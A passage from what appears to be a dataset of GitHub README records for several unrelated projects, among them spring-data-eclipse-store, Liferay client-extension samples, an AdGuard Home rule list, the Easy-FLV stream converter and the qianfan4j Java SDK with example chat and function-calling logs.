| ``>= 2.2.0``              | ``17`` | ``3.3.4``   | ``1.4.0``    |

## Demo

To see how easy it is to implement EclipseStore in your Spring project, take a look at
the [demos](./spring-data-eclipse-store-demo):

* [Simple demo](https://github.com/xdev-software/spring-data-eclipse-store/tree/develop/spring-data-eclipse-store-demo/src/main/java/software/xdev/spring/data/eclipse/store/demo/simple)
* [Complex demo](https://github.com/xdev-software/spring-data-eclipse-store/tree/develop/spring-data-eclipse-store-demo/src/main/java/software/xdev/spring/data/eclipse/store/demo/complex)
* [Demo with coexisting JPA](https://github.com/xdev-software/spring-data-eclipse-store/tree/develop/spring-data-eclipse-store-jpa/src/main/java/software/xdev/spring/data/eclipse/store/jpa)
* [Dual storage demo](https://github.com/xdev-software/spring-data-eclipse-store/tree/develop/spring-data-eclipse-store-demo/src/main/java/software/xdev/spring/data/eclipse/store/demo/dual/storage)

> [!NOTE]  
> Since the library is using reflection to copy data, the following JVM-Arguments may have to be set:
> ```
> --add-opens=java.base/java.util=ALL-UNNAMED
> --add-exports java.base/jdk.internal.misc=ALL-UNNAMED
> --add-opens=java.base/java.lang=ALL-UNNAMED
> --add-opens=java.base/java.time=ALL-UNNAMED 
> ```

## Support

If you need support as soon as possible, and you can't wait for any pull request, feel free to
use [our support](https://xdev.software/en/services/support).

## Contributing
See the [contributing guide](./CONTRIBUTING.md) for detailed instructions on how to get started with our project.

## Dependencies and Licenses

View the [license of the current project](LICENSE).
",18,2,11,apache-2.0,147.0
lgdd/liferay-client-extensions-samples,main,"![GitHub Workflow Status](https://img.shields.io/github/actions/workflow/status/lgdd/liferay-client-extensions-samples/builder.yml?label=auto-update&style=flat)
![GitHub last commit](https://img.shields.io/github/last-commit/lgdd/liferay-client-extensions-samples?color=informational&label=latest%20update)

# Liferay Client Extensions Samples

Automatically mirror official client extensions samples you can find in the main repo here: https://github.com/liferay/liferay-portal/tree/master/workspaces/liferay-sample-workspace/client-extensions

The goal of this repository is to ease the process of trying out client extensions samples by removing the burden of cloning liferay-portal & by renaming ambiguous client extensions (e.g. `custom-element-1`).

The official readme file for those samples is mirrored in the [HOW-TO.md](HOW-TO.md).

The new naming is an arbitrary choice based on the description provided by Liferay in the readme file. Here's the correspondance for the renamed client extensions:

| **Original name** | **New name**                                                 |
|-------------------|--------------------------------------------------------------|
| liferay-sample-custom-element-1  | liferay-sample-custom-element-vanilla-js      |
| liferay-sample-custom-element-2  | liferay-sample-custom-element-react-scripts   |
| liferay-sample-custom-element-3  | liferay-sample-custom-element-angular         |
| liferay-sample-custom-element-4  | liferay-sample-custom-element-react-dom       |
| liferay-sample-custom-element-5  | liferay-sample-custom-element-react-clayui    |
| liferay-sample-etc-frontend      | liferay-sample-etc-frontend-shared-import-map |
| liferay-sample-global-js-1       | liferay-sample-global-js-page			           |
| liferay-sample-global-js-2       | liferay-sample-global-js-page-with-attributes |
| liferay-sample-global-js-2       | liferay-sample-global-js-instance      			 |
| liferay-sample-iframe-1          | liferay-sample-iframe-counter                 |
| liferay-sample-iframe-2          | liferay-sample-iframe-wikipedia               |
| liferay-sample-theme-css-1       | liferay-sample-theme-css-styled               |
| liferay-sample-theme-css-2       | liferay-sample-theme-css-unstyled             |
| liferay-sample-theme-css-3       | liferay-sample-theme-css-token-definition     |
| liferay-sample-theme-spritemap-1 | liferay-sample-theme-spritemap-single-svg     |
| liferay-sample-theme-spritemap-2 | liferay-sample-theme-spritemap-multiple-svg   |

## Aditional information

If the build fails because of the Node version, you can force the use of a specific version by changing the build.gradle with something like:

```gradle
apply plugin: ""com.liferay.node""

node {
	nodeVersion = ""20.10.0""
	global = false
}
```
> Note that you can apply this for a specific client extension or all client extensions if you change the value in the parent folder (`client-extensions` or your liferay workpace).",0,0,1,mit,1.0
guandasheng/adguardhome,main,"<div align=""center"">
<h1 align=""center"">TheBestAdrules<br></h1>
  <p>TheBestAdrules，适用于Adguard Home的去广告dns规则，由关圣云®整理上游优秀的规则，合并去重而来，集百家之所长，取其精华去其糟粕。
关圣云®官网https://dns.dns1.top 官方微信群及QQ群见官网公布。
关圣云®DNS，一个人人可加入的公益去广告dns团队，目前拥有7条公益dns节点。
捐赠，或者提供服务器均可加入“关圣云®爱发电”团队。 
由于目前网络上发布的规则众多，逐个添加难免有重复的，而且不方便维护，因此创建此仓库，方便关圣云更新dns规则，也可以方便其他自建dns的小伙伴一键导入。
  </p>
</h1>
<p>
  <a href=""https://github.com/guandasheng/TheBestAdrules"">
    <img src=""https://img.shields.io/github/last-commit/guandasheng/TheBestAdrules?style=flat-square"" alt=""last update"" />
  </a>
  <a href=""https://github.com/guandasheng/TheBestAdrules"">
    <img src=""https://img.shields.io/github/forks/guandasheng/TheBestAdrules?style=flat-square"" alt=""forks"" />
  </a>
  <a href=""https://github.com/guandasheng/TheBestAdrules"">
    <img src=""https://img.shields.io/github/stars/guandasheng/TheBestAdrules?style=flat-square"" alt=""stars"" />
  </a>
  <a href=""https://github.com/guandasheng/TheBestAdrules/issues/"">
    <img src=""https://img.shields.io/github/issues/guandasheng/TheBestAdrules?style=flat-square"" alt=""open issues"" />
  </a>
  <a href=""https://github.com/guandasheng/TheBestAdrules"">
    <img src=""https://img.shields.io/github/license/guandasheng/TheBestAdrules?style=flat-square"" alt=""license"" />
  </a>
</p>

<h4>
    <a href=""#a"">规则订阅</a>
  <span> · </span>
    <a href=""#b"">上游列表</a>
  <span> · </span>
    <a href=""#c"">拦截效果</a>
  <span> · </span>
    <a href=""#d"">完善项目</a>
  </h4>

</div>

<h2 id=""a"">🎯 规则订阅</h2>

```
更新时间: 2024-01-05 16:47:17 （北京时间） 

拦截规则数量: 786040 
白名单规则数量: 7263 
``` 
<details open>
<summary>规则列表</summary>
<ul>
  
- **[黑名单规则（Github）](https://raw.githubusercontent.com/guandasheng/TheBestAdrules/main/rule/all.txt)**
- **[黑名单规则(CF国内加速-推荐)](https://github.guanmengkai.bf/https://raw.githubusercontent.com/guandasheng/TheBestAdrules/main/rule/all.txt)**
- **[黑名单规则(Gitee国内加速-延迟12H)](https://gitee.com/guanmengkai/TheBestAdrules/raw/main/rule/all.txt)**

</ul>
</details>



<h2 id=""c"">🚫 拦截效果</h2>

[AdBlock Tester](https://adblock-tester.com)

[Block Ads! Adblock test](https://blockads.fivefilters.org/)

[Ad Blocker Test](https://d3ward.github.io/toolz/adblock.html)

<h2 id=""d"">💬 完善项目</h2>

大家可以提交 Issue (不及时)
或者加入微信QQ群（及时）
QQ群号786113957
微信群加gmk2099备注dns
来帮助我完善规则 我审核之后会加入到规则，如果规则有误杀我会尽快处理



**提交范围**

- 漏拦截的广告
- 误杀的网站


",0,1,1,mit,0.0
javpower/easy-flv,main,"<!-- Easy-FLV: Java RTSP/RTMP to FLV Converter -->
# 📺 Easy-FLV: Java RTSP/RTMP to FLV Converter

[![GitHub stars](https://img.shields.io/github/stars/javpower/easy-flv.svg)](https://github.com/javpower/easy-flv) 
[![GitHub issues](https://img.shields.io/github/issues/javpower/easy-flv.svg)](https://github.com/javpower/easy-flv/issues) 
[![Apache License 2.0](https://img.shields.io/badge/license-Apache%202.0-blue.svg)](https://opensource.org/licenses/Apache-2.0) 
[![Java Version](https://img.shields.io/badge/java-1.8+-orange.svg)](https://adoptopenjdk.net/) 
[![Spring Boot](https://img.shields.io/badge/spring--boot-2.7.+-blue.svg)](https://spring.io/projects/spring-boot) 

## 🌟 About Easy-FLV
Easy-FLV is a Java library that converts RTSP or RTMP video streams into FLV format for playback in web browsers. It provides an efficient, stable, and easily integrable solution for real-time video monitoring, live streaming, and video stream processing.

### Why Choose Easy-FLV?
- **Efficient Conversion**: Quickly converts video streams to FLV format with no complex configuration required.
- **Easy Integration**: Used as a Spring Boot Starter, it can be easily integrated into any Java project.
- **Modern Browser Support**: Supports all major modern browsers without the need for additional plugins.
- **Real-time Stream Processing**: Suitable for the conversion of real-time video streams, such as security monitoring and live broadcasting.

## 📄 Screenshots
Below are screenshots of Easy-FLV in action:

![img_1.png](img_1.png)
![img.png](img.png)

## 🚀 Quick Start

### Add Maven Dependency
Include the following Maven dependency in your Spring Boot project:

```xml
<dependency>
    <groupId>io.github.javpower</groupId>
    <artifactId>rtsp-converter-flv-spring-boot-starter</artifactId>
    <version>1.5.9.1</version>
</dependency>
```

### Implement Interface
Create a service class that implements the `IOpenFLVService` interface to provide the stream address:

```java
@Service
public class RtspDataService implements IOpenFLVService {

    @Override
    public String getUrl(Integer channel) {
        // Retrieve the RTSP stream address based on the channel
        return ""rtsp://10.11.9.251:554/openUrl/16HV8mA"";
    }
}
```

### Configure YAML
Configure Easy-FLV in your `application.yml`:

```yaml
easy:
  flv:
    host: http://localhost:8200
```

### Use Interface
To get the converted stream address and play it in a browser:

- Conversion URL: `GET http://ip:port/get/flv/hls/stream_{channel}.flv`
- Direct Browser Playback: `GET http://ip:port/flv/hls/stream_{channel}.flv`

### Direct Usage
If you prefer not to implement an interface, you can directly encode the stream address and convert it:

```java
public static void main(String[] args) throws UnsupportedEncodingException {
    String url = ""rtsp://XXXXXXXX"";
    String encodedUrl = java.net.URLEncoder.encode(url, ""UTF-8"");
    System.out.println(""Encoded Stream URL: "" + encodedUrl);
}
```

- Conversion URL: `GET http://ip:port/get/flv/hls/stream?url=EncodedAddress`
- Direct Browser Playback: `GET http://ip:port/flv/hls/stream?url=EncodedAddress`

## 🛠️ Contribution
Contributions of any kind are welcome, including but not limited to reporting bugs, submitting fixes, adding new features, and improving documentation.

## 📄 License
Easy-FLV is released under the [Apache License 2.0](LICENSE).

## 📧 Contact
- Email: [javpower@163.com](mailto:javpower@163.com)
- GitHub: [https://github.com/javpower/easy-flv](https://github.com/javpower/easy-flv)
- Gitee: [https://gitee.com/giteeClass/easy-flv](https://gitee.com/giteeClass/easy-flv)
",0,3,1,apache-2.0,1.0
aicyber2023/ai-customer-service-admin,master,"# 奥图智能客服管理后台

欢迎来到我的世界，我是奥图智能客服，基于奥图大模型开发的智能客服软件。我的核心功能是利用自然语言处理技术，理解和回答用户的问题，为用户提供及时、准确的帮助。
我可以通过学习“问答库”和“文档库”中的知识，为用户提供专业的服务。通过不断学习和改进，我能够越来越准确地理解用户的意图，提供个性化的服务。
现在，我希望能通过开放平台，让更多人了解和使用我。我坚信，在用户的反馈和参与下，我能不断优化和进步，更好地服务于大众。

# 在开放平台上，我将提供以下主要功能：

- 智能问答：通过自然语言处理技术，理解和回答用户的问题，提供及时、准确的帮助。

- 私有知识库：通过垂直领域知识的训练让客服更“聪明”。

- 用户反馈：收集和分析用户的反馈信息，不断优化和改进我的功能和服务。

- 数据分析：对用户问题和反馈数据进行深入分析，发现潜在问题，为进一步优化提供数据支持。

- 多渠道接入：支持多种渠道接入，包括网站、APP、微信等，方便用户随时随地进行咨询。

- 隐私保护：严格遵守相关法律法规和伦理规范，保护用户隐私和数据安全。

我承诺，在开放平台上，我会始终保持透明和开放的态度，与用户和开发者保持紧密的沟通和合作。同时，我也希望得到您的支持和鼓励。


在未来，我期待与更多的用户和开发者一起成长、进步。让我们共同创造一个更加智能、便捷的互联网环境！

# 联系我们
产品官网：www.aicyber.com/

合作邮箱：business@aicyber.com
",0,0,1,mit,0.0
oldmanpushcart/qianfan4j,main,"# qianfan4j：千帆 Java SDK
![License](https://img.shields.io/badge/License-Apache_2.0-green.svg)
![JDK17+](https://img.shields.io/badge/JDK-17+-blue.svg)
![LLM-文心一言](https://img.shields.io/badge/LLM-%E6%96%87%E5%BF%83%E4%B8%80%E8%A8%80-blue.svg)

`qianfan4j`是一个开源的千帆大模型平台的非官方Java客户端，基于`JDK17`构建。它旨在提供一个功能丰富、易于集成和使用的Java库，以便开发者能够通过千帆API轻松实现对话、续写、向量嵌入和图像处理等功能。

> 请注意：在使用`qianfan4j`时，你需要遵守千帆API的使用条款和条件。

## 一、主要功能

`qianfan4j`支持以下千帆API功能：

- **对话（Chat）**
    - 提供用户与千帆模型进行自然语言对话。
    - 支持用户在一次对话中触发多个函数调用。

- **续写（Completions）**
    - 提供文本续写功能，可以根据给定的文本片段生成后续内容。

- **向量（Embeddings）**
    - 将文本转换为向量表示，用于文本相似度比较、聚类等任务。

- **图像（Images）**
    - **图生文：** 根据提供的图像生成描述性文本。
    - **文生图：** 将文本描述转换为相应的图像。

- **插件应用（Plugin）**
    - **知识库：** 让开发者（甚至非技术人员）以简单的方式管理数据集，包括分片、清洗、向量计算等能力。
    - **智慧图问：** 图片理解识别，并对图片内容进行总结概述，输出用户可理解的句子或段落。
    - **百度搜索：** 百度搜索插件,实时获取新闻、股票信息等
    - **网页解析：** 从任何网页链接获取所需文本信息
    - **天气查询：** 输入地址，给出当前该地址天气；输入地址+时间，给出该地址时间段内的天气

## 二、系统要求

1. **JDK17**或更高版本

## 三、跑通测试

1. 到[百度智能云](https://cloud.baidu.com/)上注册一个账号
2. 在百度智能云上[创建一个应用](https://console.bce.baidu.com/qianfan/ais/console/applicationConsole/application)，你将会得到一个API Key和一个Secret Key
3. 声明环境变量：
   ```shell
   export QIANFAN_AK=<YOUR APP-KEY>
   export QIANFAN_SK=<YOUR SECRET-KEY>
   ```
   注意：[PluginAppTestCase](https://github.com/oldmanpushcart/qianfan4j/blob/main/src/test/java/io/github/oldmanpushcart/test/qianfan4j/pluginapp/PluginAppTestCase.java)
   测试用例如果要跑通，需要在千帆大模型平台创建插件应用，开通`ocr-chat`插件。 并在配置文件中追加一行
   ```shell
   export QIANFAN_PLUGIN_APP_ID=<YOUR PLUGIN-APP ID>
   ```
4. 运行测试用例：`mvn test`

## 四、依赖使用

项目仓库托管在Maven中央仓库，你可以在`pom.xml`中添加以下依赖：
```xml
<dependency>
    <groupId>io.github.oldmanpushcart</groupId>
    <artifactId>qianfan4j</artifactId>
    <version>1.0.0</version>
</dependency>
```

### 创建客户端

```java
// 线程池
final var executor = Executors.newFixedThreadPool(10);

// 千帆客户端
final var client = QianFanClient.newBuilder()
    .ak(""***"") // API Key
    .sk(""***"") // Secret Key
    .executor(executor)
    .connectTimeout(Duration.ofSeconds(30))
    .build();
```

### 对话示例

```java
// 对话请求
final var request = ChatRequest.newBuilder()
    .model(ChatModel.ERNIE_V4)
    .messages(Message.ofUser(""hello!""))
    .build();

// 对话响应
final var response = client.chat(request)
    .async()
    .join();

// System.out.println(response);
```

输出结果

```text
2024-03-10 17:53:43 DEBUG qianfan://token/refresh success! expired=1712656423872;
2024-03-10 17:53:43 DEBUG qianfan://chat/ernie-v4.0 => {""messages"":[{""role"":""user"",""content"":""hello!""}]}
2024-03-10 17:53:45 DEBUG qianfan://chat/ernie-v4.0 <= {""id"":""as-7sntu8vk0p"",""object"":""chat.completion"",""created"":1710064425,""result"":""你好！很高兴与你交流。有什么我可以帮助你的吗？请随时告诉我。"",""is_truncated"":false,""need_clear_history"":false,""finish_reason"":""normal"",""usage"":{""prompt_tokens"":2,""completion_tokens"":16,""total_tokens"":18}}
你好！很高兴与你交流。有什么我可以帮助你的吗？请随时告诉我。
```

### 函数调用示例

在`qianfan4j`中进行函数的声明将会变成一个非常简单的事情。框架自动帮你完成了函数的声明和参数的解析。这样，你就可以专注于函数的实现，而不用再去关心函数的声明和参数的解析了。

函数声明

```java
@ChatFn(name = ""echo"", description = ""echo words"", examples = {
    @ChatFn.Example(
        question = ""echo: words"",
        thoughts = ""当用户输入echo:开头的消息时，机器人会原样返回用户输入的消息"",
        arguments = """"""
            {
                ""words"": ""hello, world""
            }
            """"""
    )
})
public class EchoFunction implements ChatFunction<EchoFunction.Echo, EchoFunction.Echo> {

    @Override
    public CompletableFuture<Echo> call(Echo echo) {
        return CompletableFuture.completedFuture(new Echo(echo.words()));
    }

    public record Echo(String words) {

    }

}
```

对话触发函数调用

```java
final var request = ChatRequest.newBuilder()
    .model(ChatModel.ERNIE_V4)
    .functions(new EchoFunction())
    .messages(Message.ofUser(""echo: HELLO WORLD!""))
    .build();

final var response = client.chat(request)
    .async()
    .join();

// System.out.println(response.content());
```

输出结果

```text
2024-03-10 17:58:37 DEBUG qianfan://token/refresh success! expired=1712656717750;
2024-03-10 17:58:37 DEBUG qianfan://chat/ernie-v4.0 => {""messages"":[{""role"":""user"",""content"":""echo: HELLO WORLD!""}],""functions"":[{""name"":""echo"",""description"":""echo words"",""parameters"":{""type"":""object"",""properties"":{""words"":{""type"":""string""}}},""responses"":{""type"":""object"",""properties"":{""words"":{""type"":""string""}}},""examples"":[[{""role"":""user"",""content"":""echo: words""},{""role"":""assistant"",""function_call"":{""name"":""echo"",""arguments"":""{\n    \""words\"": \""hello, world\""\n}\n"",""thoughts"":""当用户输入echo:开头的消息时，机器人会原样返回用户输入的消息""}}]]}]}
2024-03-10 17:58:40 DEBUG qianfan://chat/ernie-v4.0 <= {""id"":""as-aqte3cvapb"",""object"":""chat.completion"",""created"":1710064720,""result"":"""",""is_truncated"":false,""need_clear_history"":false,""function_call"":{""name"":""echo"",""thoughts"":""当用户输入echo:开头的消息时，机器人会原样返回用户输入的消息"",""arguments"":""{\""words\"":\""HELLO WORLD!\""}""},""finish_reason"":""function_call"",""usage"":{""prompt_tokens"":112,""completion_tokens"":24,""total_tokens"":136}}
2024-03-10 17:58:40 DEBUG qianfan://chat/ernie-v4.0/function <= {""words"":""HELLO WORLD!""}
2024-03-10 17:58:40 DEBUG qianfan://chat/ernie-v4.0/function => {""words"":""HELLO WORLD!""}
2024-03-10 17:58:40 DEBUG qianfan://chat/ernie-v4.0 => {""messages"":[{""role"":""user"",""content"":""echo: HELLO WORLD!""},{""role"":""assistant"",""function_call"":{""name"":""echo"",""arguments"":""{\""words\"":\""HELLO WORLD!\""}"",""thoughts"":""当用户输入echo:开头的消息时，机器人会原样返回用户输入的消息""}},{""role"":""function"",""content"":""{\""words\"":\""HELLO WORLD!\""}"",""name"":""echo""}],""functions"":[{""name"":""echo"",""description"":""echo words"",""parameters"":{""type"":""object"",""properties"":{""words"":{""type"":""string""}}},""responses"":{""type"":""object"",""properties"":{""words"":{""type"":""string""}}},""examples"":[[{""role"":""user"",""content"":""echo: words""},{""role"":""assistant"",""function_call"":{""name"":""echo"",""arguments"":""{\n    \""words\"": \""hello, world\""\n}\n"",""thoughts"":""当用户输入echo:开头的消息时，机器人会原样返回用户输入的消息""}}]]},{""name"":""echo"",""description"":""echo words"",""parameters"":{""type"":""object"",""properties"":{""words"":{""type"":""string""}}},""responses"":{""type"":""object"",""properties"":{""words"":{""type"":""string""}}},""examples"":[[{""role"":""user"",""content"":""echo: words""},{""role"":""assistant"",""function_call"":{""name"":""echo"",""arguments"":""{\n    \""words\"": \""hello, world\""\n}\n"",""thoughts"":""当用户输入echo:开头的消息时，机器人会原样返回用户输入的消息""}}]]}]}
2024-03-10 17:58:42 DEBUG qianfan://chat/ernie-v4.0 <= {""id"":""as-tj5rhmj89g"",""object"":""chat.completion"",""created"":1710064722,""result"":""您好，您输入的消息是：HELLO WORLD!，我已原样返回。请问有其他需要吗？"",""is_truncated"":false,""need_clear_history"":false,""finish_reason"":""normal"",""usage"":{""prompt_tokens"":225,""completion_tokens"":21,""total_tokens"":246}}
您好，您输入的消息是：HELLO WORLD!，我已原样返回。请问有其他需要吗？
```

### 多函数调用示例

`qianfan4j`会根据LLM的推理能力，自动拆解多函数调用的任务，然后按照拆解的任务顺序依次调用函数。这样，你就可以专注于函数的实现，而不用再去关心函数的调用顺序了。
我们假设有两个函数 [QueryScoreFunction](https://github.com/oldmanpushcart/qianfan4j/blob/main/src/test/java/io/github/oldmanpushcart/test/qianfan4j/chat/function/QueryScoreFunction.java)和 [ComputeAvgScoreFunction](https://github.com/oldmanpushcart/qianfan4j/blob/main/src/test/java/io/github/oldmanpushcart/test/qianfan4j/chat/function/ComputeAvgScoreFunction.java)，分别用于查询成绩和计算平均分。我们可以通过以下方式实现多函数调用：

```java
final var request = ChatRequest.newBuilder()
    .model(ChatModel.ERNIE_V4)
    .functions(new QueryScoreFunction(), new ComputeAvgScoreFunction())
    .option(ChatOptions.IS_STREAM, true)
    .option(ChatOptions.IS_ENABLE_SEARCH, false)
    .option(ChatOptions.TEMPERATURE, 0.01f)
    .messages(Message.ofUser(""计算李四的语文和数学平均分""))
    .build();

final var response = client.chat(request)
    .async()
    .join();

// System.out.println(response.content());
```

输出结果

```text
2024-03-10 18:02:44 DEBUG qianfan://token/refresh success! expired=1712656964044;
2024-03-10 18:02:44 DEBUG qianfan://chat/ernie-v4.0 => {""messages"":[{""role"":""user"",""content"":""计算李四的语文和数学平均分""}],""functions"":[{""name"":""query_score"",""description"":""query student's scores"",""parameters"":{""type"":""object"",""properties"":{""name"":{""type"":""string"",""description"":""the student name to query, example: \""张三\""""},""subjects"":{""type"":""array"",""description"":""the subjects to query, example: [\""MATH\"", \""CHINESE\""]"",""items"":{""type"":""string"",""enum"":[""CHINESE"",""MATH"",""ENGLISH""]}}},""required"":[""name"",""subjects""]},""responses"":{""type"":""object"",""properties"":{""message"":{""type"":""string"",""description"":""message""},""data"":{""type"":""array"",""description"":""data"",""items"":{""type"":""object"",""properties"":{""name"":{""type"":""string"",""description"":""student name""},""subject"":{""type"":""string"",""description"":""subject items"",""enum"":[""CHINESE"",""MATH"",""ENGLISH""]},""value"":{""type"":""number"",""description"":""score value""}}}},""success"":{""type"":""boolean"",""description"":""success or not""}}},""examples"":[[{""role"":""user"",""content"":""查询张三、李四的数学成绩""},{""role"":""assistant"",""function_call"":{""name"":""query_score"",""arguments"":""{\n     \""name\"": \""张三\"",\n     \""subjects\"": [\n         \""MATH\""\n     ]\n }\n"",""thoughts"":""用户需要查询张三、李四、王五的数学成绩，但函数一次只能查询一个学生，所以我们先查询张三的成绩，然后再分别查询李四和王五的数学成绩""}}],[{""role"":""user"",""content"":""查询李四的数学和语文成绩""},{""role"":""assistant"",""function_call"":{""name"":""query_score"",""arguments"":""{\n     \""name\"": \""李四\"",\n     \""subjects\"": [\n         \""MATH\"",\n         \""CHINESE\""\n     ]\n }\n"",""thoughts"":""用户需要查询李四的数学和语文成绩，函数一次可以查询一个学生的多个成绩""}}]]},{""name"":""compute_avg_score"",""description"":""计算平均成绩"",""parameters"":{""type"":""object"",""properties"":{""scores"":{""type"":""array"",""description"":""分数集合"",""items"":{""type"":""number""}}}},""responses"":{""type"":""object"",""properties"":{""avg_score"":{""type"":""number"",""description"":""平均分""}}},""examples"":[[{""role"":""user"",""content"":""张三的语文30分、数学20分、英语100分；\n李四的语文50分、数学90分、英语60分；\n计算张三的平均成绩\n""},{""role"":""assistant"",""function_call"":{""name"":""compute_avg_score"",""arguments"":""{\n     \""scores\"": [\n         30,\n         20,\n         100\n     ]\n }\n"",""thoughts"":""我应该将张三的所有分数传入，计算张三的平均分""}}],[{""role"":""user"",""content"":""张三的数学成绩是50分、语文30分、英语20分；李四的数学成绩是60分、语文90分；请计算他们的语文平均成绩""},{""role"":""assistant"",""function_call"":{""name"":""compute_avg_score"",""arguments"":""{\n     \""scores\"": [\n         30,\n         90\n     ]\n }\n"",""thoughts"":""我应该把所有人的语文分数传入，从而计算出语文的平均成绩""}}]]}],""stream"":true,""temperature"":0.01,""disable_search"":true}
2024-03-10 18:02:47 DEBUG qianfan://chat/ernie-v4.0 <= {""id"":""as-gmjf3vyemg"",""object"":""chat.completion"",""created"":1710064967,""sentence_id"":0,""is_end"":true,""is_truncated"":false,""result"":"""",""need_clear_history"":false,""function_call"":{""name"":""query_score"",""thoughts"":""我需要先查询李四的语文和数学成绩，然后计算平均分。任务拆解：[sub-task1: 使用[query_score]工具查询李四的语文和数学成绩，sub-task2: 使用[compute_avg_score]工具计算平均分]。接下来需要调用[query_score]工具来查询李四的语文和数学成绩。"",""arguments"":""{\""name\"":\""李四\"",\""subjects\"":[\""CHINESE\"",\""MATH\""]}""},""finish_reason"":""function_call"",""usage"":{""prompt_tokens"":676,""completion_tokens"":92,""total_tokens"":768}}
2024-03-10 18:02:47 DEBUG qianfan://chat/ernie-v4.0/function <= {""name"":""李四"",""subjects"":[""CHINESE"",""MATH""]}
2024-03-10 18:02:47 DEBUG qianfan://chat/ernie-v4.0/function => {""message"":""查询成功"",""data"":[{""name"":""李四"",""subject"":""CHINESE"",""value"":80.0},{""name"":""李四"",""subject"":""MATH"",""value"":70.0}],""success"":true}
2024-03-10 18:02:47 DEBUG qianfan://chat/ernie-v4.0 => {""messages"":[{""role"":""user"",""content"":""计算李四的语文和数学平均分""},{""role"":""assistant"",""function_call"":{""name"":""query_score"",""arguments"":""{\""name\"":\""李四\"",\""subjects\"":[\""CHINESE\"",\""MATH\""]}"",""thoughts"":""我需要先查询李四的语文和数学成绩，然后计算平均分。任务拆解：[sub-task1: 使用[query_score]工具查询李四的语文和数学成绩，sub-task2: 使用[compute_avg_score]工具计算平均分]。接下来需要调用[query_score]工具来查询李四的语文和数学成绩。""}},{""role"":""function"",""content"":""{\""message\"":\""查询成功\"",\""data\"":[{\""name\"":\""李四\"",\""subject\"":\""CHINESE\"",\""value\"":80.0},{\""name\"":\""李四\"",\""subject\"":\""MATH\"",\""value\"":70.0}],\""success\"":true}"",""name"":""query_score""}],""functions"":[{""name"":""query_score"",""description"":""query student's scores"",""parameters"":{""type"":""object"",""properties"":{""name"":{""type"":""string"",""description"":""the student name to query, example: \""张三\""""},""subjects"":{""type"":""array"",""description"":""the subjects to query, example: [\""MATH\"", \""CHINESE\""]"",""items"":{""type"":""string"",""enum"":[""CHINESE"",""MATH"",""ENGLISH""]}}},""required"":[""name"",""subjects""]},""responses"":{""type"":""object"",""properties"":{""message"":{""type"":""string"",""description"":""message""},""data"":{""type"":""array"",""description"":""data"",""items"":{""type"":""object"",""properties"":{""name"":{""type"":""string"",""description"":""student name""},""subject"":{""type"":""string"",""description"":""subject items"",""enum"":[""CHINESE"",""MATH"",""ENGLISH""]},""value"":{""type"":""number"",""description"":""score value""}}}},""success"":{""type"":""boolean"",""description"":""success or not""}}},""examples"":[[{""role"":""user"",""content"":""查询张三、李四的数学成绩""},{""role"":""assistant"",""function_call"":{""name"":""query_score"",""arguments"":""{\n     \""name\"": \""张三\"",\n     \""subjects\"": [\n         \""MATH\""\n     ]\n }\n"",""thoughts"":""用户需要查询张三、李四、王五的数学成绩，但函数一次只能查询一个学生，所以我们先查询张三的成绩，然后再分别查询李四和王五的数学成绩""}}],[{""role"":""user"",""content"":""查询李四的数学和语文成绩""},{""role"":""assistant"",""function_call"":{""name"":""query_score"",""arguments"":""{\n     \""name\"": \""李四\"",\n     \""subjects\"": [\n         \""MATH\"",\n         \""CHINESE\""\n     ]\n }\n"",""thoughts"":""用户需要查询李四的数学和语文成绩，函数一次可以查询一个学生的多个成绩""}}]]},{""name"":""query_score"",""description"":""query student's scores"",""parameters"":{""type"":""object"",""properties"":{""name"":{""type"":""string"",""description"":""the student name to query, example: \""张三\""""},""subjects"":{""type"":""array"",""description"":""the subjects to query, example: [\""MATH\"", \""CHINESE\""]"",""items"":{""type"":""string"",""enum"":[""CHINESE"",""MATH"",""ENGLISH""]}}},""required"":[""name"",""subjects""]},""responses"":{""type"":""object"",""properties"":{""message"":{""type"":""string"",""description"":""message""},""data"":{""type"":""array"",""description"":""data"",""items"":{""type"":""object"",""properties"":{""name"":{""type"":""string"",""description"":""student name""},""subject"":{""type"":""string"",""description"":""subject items"",""enum"":[""CHINESE"",""MATH"",""ENGLISH""]},""value"":{""type"":""number"",""description"":""score value""}}}},""success"":{""type"":""boolean"",""description"":""success or not""}}},""examples"":[[{""role"":""user"",""content"":""查询张三、李四的数学成绩""},{""role"":""assistant"",""function_call"":{""name"":""query_score"",""arguments"":""{\n     \""name\"": \""张三\"",\n     \""subjects\"": [\n         \""MATH\""\n     ]\n }\n"",""thoughts"":""用户需要查询张三、李四、王五的数学成绩，但函数一次只能查询一个学生，所以我们先查询张三的成绩，然后再分别查询李四和王五的数学成绩""}}],[{""role"":""user"",""content"":""查询李四的数学和语文成绩""},{""role"":""assistant"",""function_call"":{""name"":""query_score"",""arguments"":""{\n     \""name\"": \""李四\"",\n     \""subjects\"": [\n         \""MATH\"",\n         \""CHINESE\""\n     ]\n }\n"",""thoughts"":""用户需要查询李四的数学和语文成绩，函数一次可以查询一个学生的多个成绩""}}]]}],""stream"":true,""temperature"":0.01,""disable_search"":true}
2024-03-10 18:02:48 DEBUG qianfan://chat/ernie-v4.0 <= {""id"":""as-mghmq7fq8e"",""object"":""chat.completion"",""created"":1710064968,""sentence_id"":0,""is_end"":false,""is_truncated"":false,""result"":""李四"",""need_clear_history"":false,""finish_reason"":""normal"",""usage"":{""prompt_tokens"":812,""completion_tokens"":0,""total_tokens"":812}}
2024-03-10 18:02:49 DEBUG qianfan://chat/ernie-v4.0 <= {""id"":""as-mghmq7fq8e"",""object"":""chat.completion"",""created"":1710064969,""sentence_id"":1,""is_end"":false,""is_truncated"":false,""result"":""的语文成绩是80分，数学成绩是70分。"",""need_clear_history"":false,""finish_reason"":""normal"",""usage"":{""prompt_tokens"":812,""completion_tokens"":0,""total_tokens"":812}}
2024-03-10 18:02:49 DEBUG qianfan://chat/ernie-v4.0 <= {""id"":""as-mghmq7fq8e"",""object"":""chat.completion"",""created"":1710064970,""sentence_id"":2,""is_end"":false,""is_truncated"":false,""result"":""他的平均分是75分。"",""need_clear_history"":false,""finish_reason"":""normal"",""usage"":{""prompt_tokens"":812,""completion_tokens"":0,""total_tokens"":812}}
2024-03-10 18:02:50 DEBUG qianfan://chat/ernie-v4.0 <= {""id"":""as-mghmq7fq8e"",""object"":""chat.completion"",""created"":1710064971,""sentence_id"":3,""is_end"":false,""is_truncated"":false,""result"":""如果您需要更详细的信息或有其他问题，请随时告诉我。"",""need_clear_history"":false,""finish_reason"":""normal"",""usage"":{""prompt_tokens"":812,""completion_tokens"":0,""total_tokens"":812}}
